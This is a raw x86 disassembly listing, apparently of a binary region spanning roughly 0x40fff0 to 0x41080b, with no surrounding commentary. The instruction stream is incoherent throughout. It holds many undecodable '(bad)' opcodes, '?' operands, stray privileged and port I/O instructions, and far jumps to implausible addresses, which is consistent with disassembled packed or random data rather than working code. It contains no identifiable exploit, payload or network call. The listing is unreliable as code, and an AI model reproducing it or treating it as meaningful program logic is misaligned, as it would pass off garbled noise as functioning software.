  40fff0:	unpcklps xmm2,XMMWORD PTR [eax-0x72c86fe3]
  40fff7:	iret   
  40fff8:	sbb    al,dl
  40fffa:	call   0x6eb5ccc9
  40ffff:	shl    BYTE PTR [ebx+ebp*1],0x5e
  410003:	and    esi,ecx
  410005:	imul   DWORD PTR [edx]
  410007:	jl     0x41003f
  410009:	sbb    eax,0xa047e5b3
  41000e:	push   cs
  41000f:	inc    edx
  410010:	jle    0x410049
  410012:	cld    
  410013:	cmp    edi,DWORD PTR [esp+eiz*2-0x31dee073]
  41001a:	xor    al,0xca
  41001c:	push   edx
  41001d:	push   ebx
  41001e:	push   edi
  41001f:	cmp    BYTE PTR [esi-0x31],0x72
  410023:	xchg   BYTE PTR ds:0x30d1808a,dh
  410029:	retf   0x5cb3
  41002c:	ins    BYTE PTR es:[edi],dx
  41002d:	pop    eax
  41002e:	push   eax
  41002f:	out    0x85,eax
  410031:	ins    DWORD PTR es:[edi],dx
  410032:	adc    dl,BYTE PTR [esi]
  410034:	xor    DWORD PTR [ecx-0x61],ebx
  410037:	ins    BYTE PTR es:[edi],dx
  410038:	pop    es
  410039:	xchg   ebx,eax
  41003a:	mov    ds:0x7378ed2e,eax
  41003f:	pop    ebx
  410040:	or     al,0xa9
  410042:	aaa    
  410043:	pop    edi
  410044:	xor    BYTE PTR [ebx],ch
  410046:	pusha  
  410047:	int3   
  410048:	gs mov ch,0x5
  41004b:	add    eax,0xc850f5a6
  410050:	rcl    BYTE PTR [edi],cl
  410052:	repnz xor ebp,esp
  410055:	mov    ch,0xdd
  410057:	and    ebp,ebp
  410059:	or     eax,0x8e793fe5
  41005e:	adc    DWORD PTR [ebx+ecx*8-0x4fec4d9f],ecx
  410065:	fwait
  410066:	sti    
  410067:	or     ebp,ebp
  410069:	cmp    al,0x6a
  41006b:	in     al,dx
  41006c:	(bad)  [esi+0x7c04667e]
  410072:	add    eax,0x1dd06f7c
  410077:	add    DWORD PTR ds:0x1fdbc771,ecx
  41007d:	je     0x410031
  41007f:	sub    dh,al
  410081:	addr16 daa 
  410083:	pop    edx
  410084:	pushf  
  410085:	adc    cl,ch
  410087:	js     0x4100f2
  410089:	stos   BYTE PTR es:[edi],al
  41008a:	mov    eax,0x5577d278
  41008f:	in     al,dx
  410090:	xor    edx,DWORD PTR [eax+0x2c95a43e]
  410096:	pop    ebp
  410097:	jle    0x4100cc
  410099:	mov    BYTE PTR [edx-0x7f145e99],bl
  41009f:	sahf   
  4100a0:	(bad)  
  4100a1:	inc    BYTE PTR [edx+eiz*4]
  4100a4:	scas   al,BYTE PTR es:[edi]
  4100a5:	dec    edx
  4100a6:	add    eax,0x4eeb376
  4100ab:	ss call 0xa9328a24
  4100b1:	mov    bl,0x3a
  4100b3:	mov    ebp,DWORD PTR [ebx]
  4100b5:	push   ebx
  4100b6:	adc    eax,0xf45d1f9
  4100bb:	xchg   esi,eax
  4100bc:	or     al,0xff
  4100be:	sbb    bh,ch
  4100c0:	into   
  4100c1:	iret   
  4100c2:	ss jne 0x410109
  4100c5:	jne    0x410145
  4100c7:	data16 aam 0xb5
  4100ca:	mov    al,ds:0xe3fd9919
  4100cf:	mov    ebp,0xc109e19a
  4100d4:	push   eax
  4100d5:	hlt    
  4100d6:	mov    eax,ds:0xaff1a922
  4100db:	jl     0x41012b
  4100dd:	test   BYTE PTR [edx+eax*4+0x5b],bl
  4100e1:	push   DWORD PTR [esi*2+0x3b3359f9]
  4100e8:	mul    BYTE PTR [esi]
  4100ea:	adc    edx,ebp
  4100ec:	sub    esi,DWORD PTR [edi-0x7ee41f2e]
  4100f2:	sub    DWORD PTR [ebp+0x5be7870f],0x3afc2f5b
  4100fc:	fsubr  QWORD PTR [edi]
  4100fe:	or     DWORD PTR [edi],ecx
  410100:	and    ah,BYTE PTR [esi-0xd]
  410103:	fimul  DWORD PTR [ebp+0x4d]
  410106:	test   eax,0x1d479f28
  41010b:	push   cs
  41010c:	mov    ?,WORD PTR [edi]
  41010e:	lds    edi,FWORD PTR [esi]
  410110:	jnp    0x410096
  410112:	mov    esi,0xd9ca2989
  410117:	inc    eax
  410118:	mov    eax,ds:0xcce92bd8
  41011d:	enter  0x80f8,0x4b
  410121:	jns    0x410182
  410123:	std    
  410124:	jle    0x41016b
  410126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410127:	add    BYTE PTR [ecx+0x69af3a1c],bh
  41012d:	stos   BYTE PTR es:[edi],al
  41012e:	mov    ch,0x6c
  410130:	inc    ecx
  410131:	jg     0x410140
  410133:	rcr    DWORD PTR [edi+ebx*8+0x6f],1
  410137:	iret   
  410138:	icebp  
  410139:	(bad)  
  41013a:	mov    cl,0xdd
  41013c:	pop    esi
  41013d:	sub    esi,DWORD PTR [ecx]
  41013f:	sbb    ebx,edx
  410141:	jae    0x410183
  410143:	ret    0x672f
  410146:	retf   0xcbe4
  410149:	inc    eax
  41014a:	add    al,0xde
  41014c:	or     edx,DWORD PTR [esi]
  41014e:	cld    
  41014f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410150:	sub    DWORD PTR [ebx-0x16],edi
  410153:	ffreep st(7)
  410156:	hlt    
  410157:	fwait
  410158:	mov    gs,WORD PTR [esi+0x3d]
  41015b:	test   eax,0xf108ea5d
  410160:	aad    0xf6
  410162:	shr    DWORD PTR [ebx],0x15
  410165:	jae    0x4100f1
  410167:	mov    ebx,0x7dad06d3
  41016c:	push   esi
  41016d:	imul   esp,DWORD PTR [edi],0xffffffcb
  410170:	xchg   ebx,eax
  410171:	popf   
  410172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410173:	call   0xd543e8df
  410178:	ins    DWORD PTR es:[edi],dx
  410179:	push   0x8197550d
  41017e:	pop    ss
  41017f:	mov    es,WORD PTR [esi-0x2dbe6786]
  410185:	sar    BYTE PTR [ecx],1
  410187:	cmp    ebx,esp
  410189:	sbb    eax,DWORD PTR [ebx-0x6e]
  41018c:	jbe    0x41016f
  41018e:	xor    eax,0x4c045006
  410193:	mov    bl,0x14
  410195:	hlt    
  410196:	pop    ebx
  410197:	int3   
  410198:	jmp    0x4101f8
  41019a:	aad    0x35
  41019c:	cmp    edx,DWORD PTR [ebp+0x19ca4026]
  4101a2:	pop    esp
  4101a3:	imul   ecx,DWORD PTR [ecx+0x71],0x4f
  4101a7:	dec    edi
  4101a8:	arpl   WORD PTR [edx-0xcfdbee4],bp
  4101ae:	mov    WORD PTR [ebx+0x7f],fs
  4101b1:	push   ebp
  4101b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b3:	push   eax
  4101b4:	call   0x7c20:0x43908738
  4101bb:	adc    bl,al
  4101bd:	push   eax
  4101be:	into   
  4101bf:	jns    0x410148
  4101c1:	fisub  WORD PTR [edx-0x4cb155ab]
  4101c7:	cmc    
  4101c8:	xchg   esp,eax
  4101c9:	mov    ch,0xbc
  4101cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101cc:	int3   
  4101cd:	push   eax
  4101ce:	mov    eax,0x76d95660
  4101d3:	call   0xefd9fc98
  4101d8:	pop    esi
  4101d9:	hlt    
  4101da:	(bad)  
  4101db:	cmp    DWORD PTR [edx+edi*1],ecx
  4101de:	popf   
  4101df:	je     0x41016b
  4101e1:	or     eax,DWORD PTR [eax-0x73794860]
  4101e7:	lds    ecx,FWORD PTR [edx]
  4101e9:	dec    edx
  4101ea:	sbb    dl,BYTE PTR [ecx-0xd]
  4101ed:	mov    ecx,0x790ec6b2
  4101f2:	jmp    0x410206
  4101f4:	fstp   QWORD PTR [eax+ecx*8+0x43651d85]
  4101fb:	lods   eax,DWORD PTR ds:[esi]
  4101fc:	sahf   
  4101fd:	ficomp DWORD PTR [edi+0x7b781dbc]
  410203:	loopne 0x410234
  410205:	cmc    
  410206:	cmc    
  410207:	(bad)
  41020a:	push   edi
  41020b:	xor    al,0x74
  41020d:	pop    ecx
  41020e:	rcl    ah,1
  410210:	lods   eax,DWORD PTR ds:[esi]
  410211:	cmp    esp,DWORD PTR [ecx+0x37c6f9fc]
  410217:	xlat   BYTE PTR ds:[ebx]
  410218:	mov    BYTE PTR [edi],bh
  41021a:	mov    al,ds:0xbe12241
  41021f:	test   DWORD PTR [ebx+0x6e],0x6b0232dc
  410226:	pop    ebx
  410227:	imul   edi,DWORD PTR [ebp-0x7d964e44],0x95fb6fd0
  410231:	in     al,0xd4
  410233:	ins    BYTE PTR es:[edi],dx
  410234:	scas   eax,DWORD PTR es:[edi]
  410235:	xor    ah,al
  410237:	add    eax,0x2bd6ec
  41023c:	ja     0x4102a7
  41023e:	div    bh
  410240:	js     0x410279
  410242:	and    ah,dl
  410244:	adc    esp,DWORD PTR [ebp+0x7ad109c8]
  41024a:	lds    esi,FWORD PTR [ecx]
  41024c:	push   0x4e
  41024e:	mov    WORD PTR [eax],ss
  410250:	mov    esp,0xe8de02a0
  410255:	mov    esi,0xc3c5682e
  41025a:	jnp    0x410255
  41025c:	pop    ebp
  41025d:	retf   
  41025e:	xchg   ebp,eax
  41025f:	push   ss
  410260:	into   
  410261:	loope  0x410253
  410263:	ins    BYTE PTR es:[edi],dx
  410264:	jo     0x410216
  410266:	scas   eax,DWORD PTR es:[edi]
  410267:	clc    
  410268:	sub    BYTE PTR [ebx],ch
  41026a:	adc    dl,bh
  41026c:	jp     0x410249
  41026e:	adc    ebx,DWORD PTR [edi-0x63]
  410271:	pop    eax
  410272:	mov    al,ds:0x52e4b8ed
  410277:	out    0xb4,al
  410279:	push   edx
  41027a:	adc    al,0xec
  41027c:	xchg   esi,eax
  41027d:	shl    BYTE PTR [ebp-0x2b329485],0xb
  410284:	xchg   BYTE PTR [esp+edi*2-0x4731a752],ch
  41028b:	add    bh,0x2e
  41028e:	xor    DWORD PTR [eax+0x2a],esi
  410291:	jle    0x41023f
  410293:	mov    di,0x1e8b
  410297:	inc    BYTE PTR [esp+ebx*8]
  41029a:	nop
  41029b:	and    BYTE PTR [eax+0x45],0x23
  41029f:	push   esi
  4102a0:	cmp    eax,0x35e0062
  4102a5:	adc    BYTE PTR [eax+0x3e],0xfd
  4102a9:	scas   al,BYTE PTR es:[edi]
  4102aa:	in     al,dx
  4102ab:	int    0x18
  4102ad:	or     al,0x4e
  4102af:	pop    edi
  4102b0:	jo     0x4102d1
  4102b2:	mov    ecx,0xdce57e0e
  4102b7:	cmp    dh,BYTE PTR [edx-0x7]
  4102ba:	out    dx,al
  4102bb:	jo     0x410334
  4102bd:	cld    
  4102be:	xchg   BYTE PTR [ebx-0x24c16c30],cl
  4102c4:	adc    al,0x3a
  4102c6:	mov    bh,0xa8
  4102c8:	rol    BYTE PTR [edx-0x776da48e],1
  4102ce:	stc    
  4102cf:	(bad)  
  4102d0:	(bad)  
  4102d1:	popa   
  4102d2:	pop    ss
  4102d3:	cmp    eax,0x397ec646
  4102d8:	scas   eax,DWORD PTR es:[edi]
  4102d9:	pop    ebx
  4102da:	push   cs
  4102db:	sub    bh,ah
  4102dd:	gs pusha 
  4102df:	pop    edx
  4102e0:	sahf   
  4102e1:	mov    al,ds:0xf605171e
  4102e6:	xor    eax,0xfca2b8c3
  4102eb:	pop    ebx
  4102ec:	cmp    bl,BYTE PTR [edx+0x39aa0fe3]
  4102f2:	lock dec ecx
  4102f4:	mov    cl,0xb6
  4102f6:	lods   eax,DWORD PTR ds:[esi]
  4102f7:	je     0x41034e
  4102f9:	in     eax,0x9a
  4102fb:	jmp    0x6b3380c8
  410300:	mov    ebp,0xb8530595
  410305:	or     BYTE PTR [ebx+0x5a],0x4b
  410309:	add    bh,BYTE PTR [edx]
  41030b:	sbb    ah,BYTE PTR [eax+0x7]
  41030e:	stc    
  41030f:	mov    edi,0xa90d5a9d
  410314:	in     al,dx
  410315:	mov    ah,0x47
  410317:	cmp    edi,DWORD PTR [ebp+0x28]
  41031a:	xor    ebp,edx
  41031c:	ficomp WORD PTR ds:0x61ba7b65
  410322:	sub    DWORD PTR [ecx-0x524afc33],edx
  410328:	jg     0x4102af
  41032a:	sbb    DWORD PTR ds:0xbad066bd,0x49
  410331:	lods   al,BYTE PTR ds:[esi]
  410332:	test   eax,0xaba3d9e0
  410337:	sbb    esi,DWORD PTR cs:[ebx+0x7fe22433]
  41033e:	call   0xf428:0x5778e545
  410345:	in     eax,dx
  410346:	jnp    0x410333
  410348:	adc    ecx,DWORD PTR [edi+0x5a]
  41034b:	ficomp WORD PTR [esi+0x70281016]
  410351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410352:	xchg   esp,eax
  410353:	ds or  eax,0xe26a5e3c
  410359:	mov    edi,esp
  41035b:	not    BYTE PTR [eax-0x73ff052b]
  410361:	xchg   ebx,eax
  410362:	sbb    DWORD PTR ds:[edi],esp
  410365:	ins    DWORD PTR es:[edi],dx
  410366:	stos   WORD PTR es:[edi],ax
  410368:	jecxz  0x410305
  41036a:	arpl   WORD PTR [edi],cx
  41036c:	inc    ebx
  41036d:	ja     0x41032b
  41036f:	or     al,0x3
  410371:	and    BYTE PTR [edx+0x291af1f8],dl
  410377:	jp     0x41036d
  410379:	inc    ebp
  41037a:	pop    ss
  41037b:	inc    esi
  41037c:	fnstsw ax
  41037e:	xchg   DWORD PTR [esi-0x200bc488],edi
  410384:	cmp    BYTE PTR [ecx],al
  410386:	rol    DWORD PTR [ecx+0x19],1
  410389:	jnp    0x41034d
  41038b:	push   esp
  41038c:	test   eax,0x33392943
  410391:	inc    esp
  410392:	mov    eax,ds:0x52c5ca34
  410397:	je     0x410329
  410399:	jge    0x4103ac
  41039b:	xchg   ebx,eax
  41039c:	outs   dx,DWORD PTR ds:[esi]
  41039d:	(bad)  
  41039e:	xor    BYTE PTR [edi-0x7f],dh
  4103a1:	test   BYTE PTR [ecx-0x48],dh
  4103a4:	add    eax,0xd14ab52f
  4103a9:	cs cmp al,0x55
  4103ac:	pop    edi
  4103ad:	push   cs
  4103ae:	enter  0x8fe7,0x33
  4103b2:	push   es
  4103b3:	push   ecx
  4103b4:	mov    WORD PTR [ebp+0x15],es
  4103b7:	sub    eax,0x8ea7c2ba
  4103bc:	jbe    0x410382
  4103be:	lahf   
  4103bf:	xchg   ebx,eax
  4103c0:	scas   eax,DWORD PTR es:[edi]
  4103c1:	mov    ch,0xb1
  4103c3:	xchg   esi,eax
  4103c4:	js     0x41035a
  4103c6:	aad    0x7e
  4103c8:	fisubr DWORD PTR [edi+0x83fc392]
  4103ce:	(bad)  
  4103cf:	repz imul esp,DWORD PTR [ebp-0x671ed439],0xec51d36e
  4103da:	les    esi,FWORD PTR [edi+ebp*8]
  4103dd:	in     eax,dx
  4103de:	cmp    DWORD PTR ds:0xef7aff68,ebx
  4103e4:	inc    ebx
  4103e5:	cmp    eax,0x43a981ca
  4103ea:	aam    0x75
  4103ec:	cdq    
  4103ed:	pop    esi
  4103ee:	push   ebx
  4103ef:	rcl    bh,1
  4103f1:	jp     0x410460
  4103f3:	cli    
  4103f4:	add    eax,DWORD PTR [ecx+0x6ecd0c9]
  4103fa:	fdivr  QWORD PTR [esi+0x29]
  4103fd:	sub    eax,0xe41ab1a9
  410402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410403:	imul   esp,edi,0xffffffdc
  410406:	jmp    0xb63a:0xe2430294
  41040d:	iret   
  41040e:	xor    edx,esi
  410410:	xchg   edi,eax
  410411:	jb     0x410469
  410413:	test   eax,ebp
  410415:	pop    ds
  410416:	or     eax,0x754e2e12
  41041b:	popf   
  41041c:	cmp    BYTE PTR [edi],bh
  41041e:	jge    0x4103c5
  410420:	in     eax,0x97
  410422:	jbe    0x410420
  410424:	inc    esp
  410425:	fld    TBYTE PTR [edi+0x292e7af8]
  41042b:	or     DWORD PTR [edx+ebp*1],eax
  41042e:	mov    ebp,0xcad2ee7
  410433:	cmc    
  410434:	cli    
  410435:	push   0xffffff8f
  410437:	retf   
  410438:	push   0xffffffbd
  41043a:	or     DWORD PTR [eax+0x6bedb98],ebx
  410440:	fistp  QWORD PTR [eax+ecx*1+0x44]
  410444:	iret   
  410445:	rol    ah,cl
  410447:	bsf    ebx,DWORD PTR [ecx+0x48]
  41044b:	jl     0x4103e8
  41044d:	inc    ebx
  41044e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41044f:	in     al,0x89
  410451:	mov    eax,ds:0xa4ee42c7
  410456:	jns    0x410497
  410458:	aam    0x36
  41045a:	xchg   BYTE PTR [eax-0x58],cl
  41045d:	push   ecx
  41045e:	pop    ds
  41045f:	test   al,0xee
  410461:	sbb    esi,DWORD PTR [ecx]
  410463:	mov    ebx,0xda031828
  410468:	push   0xfffffffd
  41046a:	rcr    edi,cl
  41046c:	sub    BYTE PTR [edi],ch
  41046e:	lods   al,BYTE PTR ds:[esi]
  41046f:	dec    edx
  410470:	and    bl,ah
  410472:	ret    0x14c1
  410475:	mov    ?,esi
  410477:	push   edx
  410478:	mov    ds:0x4865f24b,al
  41047d:	add    eax,0x24259d22
  410482:	inc    edx
  410483:	dec    ecx
  410484:	adc    BYTE PTR [ecx+0x2edc0b80],0x56
  41048b:	mov    dl,0xef
  41048d:	sub    DWORD PTR [ebx+eax*1-0x2b],0xffffff8e
  410492:	in     eax,0xce
  410494:	call   0x9b87df3c
  410499:	mov    ebx,0x4b0afc50
  41049e:	ja     0x41044b
  4104a0:	cmp    eax,0xb3189ed9
  4104a5:	jl     0x4104dd
  4104a7:	xor    BYTE PTR [eax+0x73ed284b],bl
  4104ad:	loopne 0x410496
  4104af:	mov    dl,0xa8
  4104b1:	hlt    
  4104b2:	or     ebp,edi
  4104b4:	sar    BYTE PTR [eax+0x35],0x99
  4104b8:	(bad)  
  4104b9:	jns    0x410512
  4104bb:	jge    0x4104b0
  4104bd:	ds ret 0xcebc
  4104c1:	dec    ebx
  4104c2:	pop    edx
  4104c3:	out    dx,al
  4104c4:	call   DWORD PTR [ecx+0x52]
  4104c7:	xchg   edx,eax
  4104c8:	push   eax
  4104c9:	(bad)  
  4104ca:	retf   
  4104cb:	xlat   BYTE PTR ds:[ebx]
  4104cc:	pushf  
  4104cd:	lods   al,BYTE PTR ds:[esi]
  4104ce:	aad    0x1d
  4104d0:	daa    
  4104d1:	cmp    ch,BYTE PTR [esi-0x3c1ab5fc]
  4104d7:	fsubr  QWORD PTR [edi+0x37]
  4104da:	mov    ds:0x5a8cbbfc,eax
  4104df:	jno    0x4104e9
  4104e1:	les    ebx,FWORD PTR [edi+0x62]
  4104e4:	lock retf 
  4104e6:	std    
  4104e7:	fisttp DWORD PTR [bx+di]
  4104ea:	cwde   
  4104eb:	scas   al,BYTE PTR es:[edi]
  4104ec:	xchg   BYTE PTR [esi-0x526eca60],ch
  4104f2:	pop    edx
  4104f3:	or     eax,0xff9ca4b0
  4104f8:	mov    ah,0x3f
  4104fa:	shl    ebp,cl
  4104fc:	add    BYTE PTR [ecx-0x7a],dl
  4104ff:	push   0xa851b546
  410504:	(bad)  
  410505:	arpl   WORD PTR [eax],si
  410507:	inc    edi
  410508:	repz stc 
  41050a:	das    
  41050b:	jmp    0x7962bd81
  410510:	mov    edx,esp
  410512:	jmp    0x410552
  410514:	fwait
  410515:	aas    
  410516:	cli    
  410517:	and    eax,0x51663db7
  41051c:	sub    DWORD PTR [edi+0x65c3c04f],0xe704b59e
  410526:	nop
  410527:	inc    edi
  410528:	es dec edi
  41052a:	scas   al,BYTE PTR es:[edi]
  41052b:	out    dx,eax
  41052c:	(bad)  
  41052d:	in     eax,dx
  41052e:	mov    edx,0xdcac1a8b
  410533:	lea    eax,[ebp-0x4bd3506a]
  410539:	xor    BYTE PTR es:[ebx],al
  41053c:	into   
  41053d:	and    esi,ecx
  41053f:	in     al,0xcd
  410541:	xchg   esi,eax
  410542:	popf   
  410543:	sub    eax,0xecea7243
  410548:	dec    esi
  410549:	xchg   edi,eax
  41054a:	adc    DWORD PTR [edx],0x259c2c1f
  410550:	xlat   BYTE PTR ds:[ebx]
  410551:	inc    edx
  410552:	lahf   
  410553:	mov    bl,0x7f
  410555:	sti    
  410556:	scas   eax,DWORD PTR es:[edi]
  410557:	add    bl,BYTE PTR [eax+0x3e]
  41055a:	fistp  DWORD PTR [edi+0x4d]
  41055d:	scas   al,BYTE PTR es:[edi]
  41055e:	push   ecx
  41055f:	inc    ecx
  410560:	sub    eax,0x3b00e460
  410565:	inc    edi
  410566:	sbb    bl,ah
  410568:	repz xchg ebp,eax
  41056a:	scas   eax,DWORD PTR es:[edi]
  41056b:	out    dx,al
  41056c:	enter  0xb151,0x71
  410570:	movsx  esi,BYTE PTR [eax+0x49]
  410574:	xor    esi,esi
  410576:	stos   DWORD PTR es:[edi],eax
  410577:	adc    DWORD PTR [edi+0x79dc4122],esi
  41057d:	lods   eax,DWORD PTR ds:[esi]
  41057e:	mov    ebp,DWORD PTR [esi+0x6413dac4]
  410584:	pop    esi
  410585:	das    
  410586:	sbb    al,0x34
  410588:	add    bh,BYTE PTR [edi+ebp*4-0x621513d]
  41058f:	push   ecx
  410590:	jle    0x410522
  410592:	or     al,0x9a
  410594:	ficomp WORD PTR [esi+edx*4-0x1]
  410598:	xchg   ebx,eax
  410599:	pop    eax
  41059a:	js     0x4105fb
  41059c:	fs fcomp st(5)
  41059f:	jmp    0x4159:0x55a0c599
  4105a6:	aam    0x49
  4105a8:	and    ecx,0x65
  4105ab:	pop    edx
  4105ac:	clc    
  4105ad:	jl     0x41053b
  4105af:	lods   al,BYTE PTR ds:[esi]
  4105b0:	sbb    al,0x3b
  4105b2:	pop    ss
  4105b3:	cs adc eax,0xadf95326
  4105b9:	out    dx,ax
  4105bb:	add    DWORD PTR [edi+edx*1-0x4b6fbc9c],ebx
  4105c2:	xor    BYTE PTR [edx+0x33c29971],bl
  4105c8:	jmp    0x410622
  4105ca:	in     al,dx
  4105cb:	add    DWORD PTR [ecx+ebp*2],ecx
  4105ce:	cmp    DWORD PTR [edi+0x37bb0c92],eax
  4105d4:	inc    ecx
  4105d5:	imul   ebp,ebp,0x6220b872
  4105db:	cld    
  4105dc:	std    
  4105dd:	push   cs
  4105de:	dec    edx
  4105df:	dec    ecx
  4105e0:	and    BYTE PTR [ecx],dh
  4105e2:	das    
  4105e3:	dec    ebp
  4105e4:	xlat   BYTE PTR ds:[ebx]
  4105e5:	(bad)  
  4105e6:	lock cmp DWORD PTR [ebp+0x668f59c2],ebx
  4105ed:	shl    DWORD PTR [eax],cl
  4105ef:	mov    al,BYTE PTR [edx+0x78]
  4105f2:	mov    BYTE PTR [eax+0x3b],cl
  4105f5:	test   eax,0xa0bb69fd
  4105fa:	call   0xe976c00d
  4105ff:	xchg   edx,eax
  410600:	adc    eax,0xb2fdb336
  410605:	and    ch,BYTE PTR [ebp+0x4a73d16b]
  41060b:	pop    ebx
  41060c:	sbb    eax,0x885003bc
  410611:	test   BYTE PTR [ebx+edx*8],cl
  410614:	jge    0x4105c5
  410616:	adc    esi,DWORD PTR cs:[ebx+0x55]
  41061a:	cdq    
  41061b:	xchg   esi,eax
  41061c:	mov    gs,WORD PTR ds:0x1f3155a
  410622:	push   ds
  410623:	dec    edx
  410624:	jo     0x41061d
  410626:	cs pop ebx
  410628:	mov    ecx,0x9ce83ca
  41062d:	lahf   
  41062e:	sahf   
  41062f:	pop    ecx
  410630:	(bad)  
  410631:	mov    es,WORD PTR [ebp+edx*8+0x54]
  410635:	xchg   edx,eax
  410636:	pcmpgtd mm3,mm6
  410639:	mov    eax,ds:0x81095330
  41063e:	xchg   ebx,eax
  41063f:	into   
  410640:	add    esi,DWORD PTR [edi+0x681edcf7]
  410646:	xchg   edx,eax
  410647:	push   ds
  410648:	pop    edx
  410649:	add    eax,0x16bcf838
  41064e:	jle    0x41068d
  410650:	xor    DWORD PTR [esp+ecx*1-0x6b067da9],ebp
  410657:	out    0x99,eax
  410659:	fisttp QWORD PTR [ebx-0x14]
  41065c:	imul   BYTE PTR [esp-0x758177ff]
  410663:	bound  ebx,QWORD PTR [eax+0x39]
  410666:	mul    BYTE PTR [ebx]
  410668:	stc    
  410669:	(bad)  
  41066a:	clc    
  41066b:	cmp    al,0x1a
  41066d:	mov    ds:0x866399eb,al
  410672:	je     0x4105fe
  410674:	retf   0xfaa3
  410677:	jl     0x410677
  410679:	mov    ebx,0x92551f4d
  41067e:	pop    esi
  41067f:	pop    ds
  410680:	cdq    
  410681:	call   0xfdae8d7a
  410686:	mov    edi,0x1699b77f
  41068b:	sub    al,0x8e
  41068d:	fsubrp st(1),st
  41068f:	jo     0x4106ef
  410691:	add    cl,cl
  410693:	jmp    0xdea46592
  410698:	push   ds
  410699:	loop   0x4106cb
  41069b:	out    0x7d,al
  41069d:	leave  
  41069e:	lahf   
  41069f:	(bad)  [ecx+0x7f2e6bff]
  4106a5:	stos   DWORD PTR es:[edi],eax
  4106a6:	mov    eax,?
  4106a8:	xor    al,0x98
  4106aa:	out    dx,eax
  4106ab:	(bad)  
  4106ac:	mov    esp,0xc5145337
  4106b1:	jmp    0x4fbefd8b
  4106b6:	sti    
  4106b7:	mov    dh,0x14
  4106b9:	mov    esi,0x83b8c5ad
  4106be:	cmp    al,0x66
  4106c0:	dec    esi
  4106c1:	pushf  
  4106c2:	sbb    DWORD PTR [edi-0x70812236],ebp
  4106c8:	dec    edi
  4106c9:	xchg   edx,eax
  4106ca:	fnsave [esi+0x13]
  4106cd:	jne    0x410706
  4106cf:	(bad)  [si-0x35]
  4106d4:	sbb    edi,DWORD PTR [ebp+0x772eb8bb]
  4106da:	test   al,0xa
  4106dc:	out    dx,al
  4106dd:	push   0x880e0de1
  4106e2:	pop    esi
  4106e3:	jmp    0xeea5d2bf
  4106e8:	shl    BYTE PTR [esi-0x140507cc],cl
  4106ee:	mov    ch,0xe9
  4106f0:	test   eax,0x102b8736
  4106f5:	loope  0x410725
  4106f7:	push   cs
  4106f8:	mov    cl,0xb8
  4106fa:	mov    dl,0x29
  4106fc:	sbb    al,0x9c
  4106fe:	lahf   
  4106ff:	xor    eax,0x2eee6b2
  410704:	sti    
  410705:	out    0xb6,eax
  410707:	adc    DWORD PTR [eax],edx
  410709:	nop
  41070a:	pushf  
  41070b:	xor    edi,DWORD PTR [esi]
  41070d:	cwde   
  41070e:	enter  0xd0c4,0xbc
  410712:	pop    ecx
  410713:	jmp    0x4106cf
  410715:	test   edi,ebx
  410717:	and    eax,0x2cc14974
  41071c:	shr    DWORD PTR [esi-0x43f0df7a],cl
  410722:	scas   al,BYTE PTR es:[edi]
  410723:	les    esi,FWORD PTR [ecx+eax*1-0x5c]
  410727:	mov    cl,0x48
  410729:	hlt    
  41072a:	loopne 0x41073a
  41072c:	cmc    
  41072d:	adc    eax,0x30b8b15
  410732:	test   BYTE PTR [ebp+ebx*1-0xc],0x94
  410737:	in     al,0xc3
  410739:	push   ss
  41073a:	jbe    0x41071d
  41073c:	mov    ch,0x3f
  41073e:	imul   ecx
  410740:	test   eax,0xe6e0aca4
  410745:	push   ebx
  410746:	mov    edi,DWORD PTR [ecx-0x4e462a25]
  41074c:	std    
  41074d:	nop
  41074e:	push   edi
  41074f:	xchg   esi,eax
  410750:	push   esi
  410751:	jecxz  0x41071b
  410753:	pop    eax
  410754:	fnstenv [eax-0x8f6e29e]
  41075a:	jp     0x410705
  41075c:	mov    fs:0xd4a153db,al
  410762:	jo     0x410762
  410764:	sub    DWORD PTR [eax-0x12fe2554],ebx
  41076a:	stos   DWORD PTR es:[edi],eax
  41076b:	stc    
  41076c:	shl    DWORD PTR [ebp+0x6c],0xd3
  410770:	sub    DWORD PTR [esi+0x240b5b8a],0x7aa90442
  41077a:	pop    ss
  41077b:	jb     0x41075b
  41077d:	pop    esi
  41077e:	push   esi
  41077f:	out    dx,al
  410780:	dec    DWORD PTR [edi-0x695802cc]
  410786:	mov    ebp,?
  410788:	xor    edi,DWORD PTR [edi-0x3ed1640]
  41078e:	push   ebp
  41078f:	call   0x5428:0x871e6043
  410796:	sbb    ah,bh
  410798:	mov    cl,0x31
  41079a:	aas    
  41079b:	sub    ch,BYTE PTR [esi+0x2e]
  41079e:	mov    ecx,0xfa389a08
  4107a3:	push   edx
  4107a4:	mov    esi,0xf6773a8a
  4107a9:	sub    BYTE PTR ds:0x1e06ad9e,al
  4107af:	mov    al,dh
  4107b1:	dec    esp
  4107b2:	sbb    DWORD PTR [edx],esp
  4107b4:	test   al,0x5
  4107b6:	cmc    
  4107b7:	pop    es
  4107b8:	add    DWORD PTR [esi-0x3f],0xb7f21d05
  4107bf:	jae    0x4107bb
  4107c1:	imul   esi,DWORD PTR [ecx+0x7d],0x3c
  4107c5:	sub    ch,dh
  4107c7:	retf   
  4107c8:	or     al,0x45
  4107ca:	or     cl,BYTE PTR [esi+0x5a]
  4107cd:	ret    0x26d
  4107d0:	sbb    eax,edx
  4107d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107d3:	addr16 pop ecx
  4107d5:	movaps XMMWORD PTR [esi],xmm6
  4107d8:	shl    DWORD PTR [ecx+0x65],0xcb
  4107dc:	clc    
  4107dd:	test   al,0x34
  4107df:	loopne 0x4107c0
  4107e1:	sub    eax,0x9f650164
  4107e6:	fcom   QWORD PTR [ecx]
  4107e8:	dec    ebx
  4107e9:	sub    eax,0xcf1e4fbe
  4107ee:	mov    al,0x44
  4107f0:	cmp    al,0xb6
  4107f2:	xlat   BYTE PTR ds:[ebx]
  4107f3:	xchg   esi,eax
  4107f4:	or     al,0xb9
  4107f6:	jmp    0x2298:0xa4827169
  4107fd:	retf   0x1418
  410800:	mov    ch,0x3e
  410802:	dec    esi
  410803:	stos   BYTE PTR es:[edi],al
  410804:	dec    edi
  410805:	fidivr DWORD PTR [esi+0x7ed579a3]
  41080b:	inc    esp
